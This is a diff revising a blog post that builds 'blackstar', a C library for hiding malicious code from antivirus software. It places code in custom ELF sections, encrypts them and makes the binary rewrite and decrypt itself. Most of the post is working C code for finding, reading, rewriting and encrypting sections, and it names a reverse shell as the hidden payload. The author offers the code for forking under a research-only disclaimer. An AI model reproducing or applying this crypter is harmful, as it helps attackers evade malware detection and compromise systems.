@@ -9,47 +9,43 @@ published: true
 comments: false
 ---
 
-If you want to hide malicious code from an Anti-Virus software, there is a wide array of techniques you can pick from. Here, we will attempt to abuse a widely known feature of the **ELF** file format to encrypt some code, then let the binary rewrite itself in order to decrypt the code we wanted to hide in the first place.
+If you want to hide malicious code from Anti-Virus softwares, there is a wide array of techniques you can pick from. In this work, I tried to abuse a widely known feature of the **ELF** file format to encrypt some code, and then let the binary rewrite itself in order to decrypt the code I wanted to hide in the first place. My work is based on a [PoC's team project](https://github.com/PocInnovation) which itself is inpired from a [whitepaper](http://papermint-designs.com/dmo-blog/2016-01-pocrypt-a-proof-of-concept-for-dynamically-decrypt-linux-binaries) that explains how to use **ELF**'s `SECTION`s to hide malicious code. In this post, I am going to introduce PoC's implementation approach and show off the improvements I have managed to add for more genericity and scalability. I will also discuss some short-term perpectives for those who are interested in the subject. Feel free to fork my work or send me your feedbacks.
 
 > 💥
 > The source code I am sharing here is only meant for research 
 > and educational purposes. I am not liable for anything you will do with it :)~
 
-## ELF : **E**xecutable and **L**inkable **F**ile
+## ELF : **E**xecutable and **L**inkable **F**ile - the starting point
 
-ELF is the file format used to define compiled programs on Linux. There is a lot of documentation available for this file format, since it has been around for a very long time - languages like Rust, C, C++ or Haskell compile their code to ELF files on Linux.
+ELF is the file format used to define compiled programs on Linux. There is a lot of documentation available on this file format, since it has been around for a very long time -- languages like Rust, C, C++ or Haskell compile their code to ELF files on Linux.
 
 > 🛈 An ELF file is made up of a header, followed by the file's executable data, which is splitted in sections
 
-The ELF format has been in used since 1999, in a lot of Unix-based systems, like Linux. An ELF file is made up of a header, followed by the file's executable data, which is splitted in sections.
+The ELF format has been in used since 1999 -- in a lot of Unix-based systems, like Linux -- and is made up of a header, followed by the file's executable data which is splitted into sections.
 
 ![ELF file format walkthrough](../assets/images/blackstar/elf_file_format.png "elf_file_format")
 
-As we can see from the image above, Sections are just contents of the executable, with different levels of permissions. Here, it is mainly interesting because we can easily split and find compiled code in our executable file. This could allow us to encrypt some of our code to evade anti-virus software.
-
-You can easily get a section's size using `size -dA`:
+As one can see from the image above, the executable is divided into *Sections* with different levels of permission. Sections are a very practical way to split, find, smartly encrypt compiled code and evade anti-virus softwares. Sections size can be queried using `size -dA`:
 
 ![Demonstration of the size -dA command](../assets/images/blackstar/size_eval_expr.png "size -dA output")
 
-In our case, we use sections as a way to compartimentalize our code, splitting into code that is safe to read for an anti-virus software on one side, and code that we want to hide on the other side.
+In my work, I used sections as a way to *partition* the code and I provided specific tools to smartly encrypt some parts in order to evade anti-virus softwares.
+
+> 💡 I used sections as a way to *partition* the code and provided specific tools to smartly encrypt the parts in order to evade anti-virus softwares.
 
 ## State of the Art ~ WhiteComet
 
-This project is based on a [whitepaper](http://papermint-designs.com/dmo-blog/2016-01-pocrypt-a-proof-of-concept-for-dynamically-decrypt-linux-binaries) which has been around since 2016. [PoC](https://github.com/PocInnovation) has also done some research on the matter, which is where the idea for this project comes from.
+As I said above, this project is based on a [whitepaper](http://papermint-designs.com/dmo-blog/2016-01-pocrypt-a-proof-of-concept-for-dynamically-decrypt-linux-binaries) which has been around since 2016. [PoC](https://github.com/PocInnovation) has also done some research on the matter and shared some code -- that I partly used as a starting point for this project.
 
-As a Proof of Concept, WhiteComet works pretty well. It indeed demonstrates how to use ELF sections to hide malicious code. However, the implementation is not easy to replicate, because of a lack of documentation, and code repetition.
+As a Proof of Concept, WhiteComet works pretty well. It indeed demonstrates how to use ELF sections to hide malicious code. However, the implementation is not easy to replicate because of lacks of documentation and genericity.
 
 > 🗒 This project is based on a [whitepaper](http://papermint-designs.com/dmo-blog/2016-01-pocrypt-a-proof-of-concept-for-dynamically-decrypt-linux-binaries) which has been around since 2016.
 
+For instance, PoC's iplementation depends on [fixed-size values](https://github.com/PoCInnovation/Whitecomet-Research/blob/master/PolyMetamorphic/Linux-ELF/include/PoCrypt.h#L44) -- which makes it hard to adapt or to scale. This is my main improvement axis for more genericity and scalability. In the following lines, I am going to expose concreteley how I processed and discuss the short-term perspectives.
 
-Also, PoC's implementation depends on [fixed-size values](https://github.com/PoCInnovation/Whitecomet-Research/blob/master/PolyMetamorphic/Linux-ELF/include/PoCrypt.h#L44), which makes the code hard to improve or to maintain because sections size should be queried manually.
-Therefore, neither replication in another program nor scalability are straightforward with this approach. I wanted need to work towards a more usable technique to bypass these limitations.
+## Delimiting the Code into Sections
 
-## Delimiting the code into sections
-
-If we use the GCC compiler, we can just use `attributes` to create new sections at compile time. This will also be really helpful later, because we can easily have aliases for each section we are using and do *weird* stuff with.
-
-This is done in WhiteComet (and our project) using simple macros, like so:
+Thanks to a GCC compiler feature, I used `attributes` to create new sections at compile time. This is really helpful because one can easily have aliases at hand for a given executable section and manipulate it *at will*. As in WhiteComet, I achieved this project using simple macros, like so:
 
 ```c
 /// Encryption key's section name
@@ -69,7 +65,7 @@ static SECTION(ELF_BOOL) bool is_encrypted = true;
 static SECTION(ELF_KEY) char key[256];
 ```
 
-Now that we have defined our sections, we can use them in front of functions for we want them to be part of these custom sections:
+Then I used the labeled sections to decorate the functions I want to bind in:
 
 ```c
 SECTION(ELF_CODE)
@@ -88,19 +84,21 @@ void setup_payload(settings_t *settings)
 }
 ```
 
-As you can tell, this malware is just a [reverse shell](https://fr.wikipedia.org/wiki/Reverse_shell) for now, but we will change that.
+As you can tell, the above malware is just a [reverse shell](https://fr.wikipedia.org/wiki/Reverse_shell) for now, but we could do more as you might expect.
 
-## Improving our developper's environnment
+## Improving the developper's environnment : my toolset library
 
-Since we are conducting our experiment on ELF files, and we need our program to rewrite itself, we will need to give our code a toolset of functions to help it find offsets in a binary, encrypt and decrypt data, implement custom algorithms...
+Since I am conducting this experiment on ELF files and need the program to rewrite itself, I managed to build a toolset library in order to find offsets in a binary, encrypt and decrypt data, implement custom algorithms... among others. The library will be opensource so one can easily port to other programs, debug and document.
 
-We also want to build code we can easily port to other programs, debug and document.
-
-We used [this Makefile](https://github.com/bogdzn/blackstar/blob/main/lib/star/Makefile) to build our library. As you can see in the `PROD_FLAGS` variable, we can strip data from this binary file, and then compile it with an unstripped program later, without much complications. We also set up [documentation](https://github.com/bogdzn/blackstar/tree/main/lib/star/docs) with Doxygen to help the community re-using and improving this code.
+I used [this Makefile](https://github.com/bogdzn/blackstar/blob/main/lib/star/Makefile) to build the library. As you can see in the `PROD_FLAGS` variable, one can strip data from this binary file, and then compile it back easily with an unstripped program. The full [documentation](https://github.com/bogdzn/blackstar/tree/main/lib/star/docs) is generated with Doxygen.
 
 ## Playing with the ELF file format
 
-Once our setup is done, we can start to build some useful functions. The first one will be a function that will look for an ELF section using the section's name:
+Once our setup is done, we can start to build some useful functions.
+
+### Searching sections by name
+
+The first one will be a function that will look for an ELF section using the section's name:
 
 ```c
 Elf64_Shdr *bl_find_section(void *hdr, char const *name)
@@ -127,7 +125,11 @@ Elf64_Shdr *bl_find_section(void *hdr, char const *name)
 }
 ```
 
-As you can see, we take a pointer named `hdr` as a parameter, which is the start of our whole binary file dumped into memory. This means we will need a function to read our file:
+As you can see, we take a pointer named `hdr` as a parameter, which is the head of our whole binary file dumped into memory.
+
+This means we will need a function to read our file:
+
+### Reading binary files
 
 ```c
 /**
@@ -166,7 +168,12 @@ blackstar_t *bl_read(char const *filepath)
 }
 ```
 
-In the code shown above, keen observers can see that we have saved the path to our binary file. We will need to rewrite our binary later on, after having encrypted our data. Let's write a function for that as well :
+In the code shown above, keen observers can see that we have saved the path to our binary file. We will need to rewrite our binary later on, after having encrypted our data.
+
+Let's write a function for that as well :
+
+### Rewriting the encrypted data
+
 
 ```c
 int bl_sync(blackstar_t *bstar)
@@ -188,7 +195,11 @@ int bl_sync(blackstar_t *bstar)
 }
 ```
 
-With this, we have our basic tools to do polymorphic ELF file handling. Now, we want to let the user set its own encryption algorithm, but we still want to provide some kind of wrapper to handle the complicated offset calculations and IO operations. To do this, we will offer a standard function pointer defined as follows :
+With this, we have our basic tools to do polymorphic ELF file handling. Now, we want to let the user set its own encryption algorithm, but we still want to provide some kind of wrapper to handle the complicated offset calculations and IO operations.
+
+### Applying encryption
+
+To do this, we will offer a standard function pointer defined as follows :
 
 ```c
 /**
@@ -223,6 +234,8 @@ void bl_naive_crypter(blackstar_t *, const char *, const char *, crypter_t);
 This function will be the heart of our library. It will need to find the section to edit, read its content, then call the crypter function.
 
 To simplify our code, we will also offer a standard function to encrypt our section:
+
+### Standard section encryption function
 
 ```c
 int bl_encrypt_section(blackstar_t *bstar, const char *code_sname,
@@ -261,7 +274,9 @@ const char *key_sname, const char *bool_sname, crypter_t crypter, char *key)
 }
 ```
 
-To test our program, we can write a very simple program that will just encrypt a section:
+### Usage 
+
+To test our program, we can write a very simple program that will encrypt a section:
 
 ```c
 void encrypt_program(char const *binary_path, char *key,
@@ -287,7 +302,7 @@ This makes it almost usable, but we will need to think about a way to support mo
 
 ## Testing our Polymorphic capabilites
 
-We can just try to compile, crypt then execute our program, and check the differences:
+We can try to compile, encrypt, then execute our program, and check the differences:
 
 ![testing polymorphism](../assets/images/blackstar/exec.png "Compiling and testing our program")
 
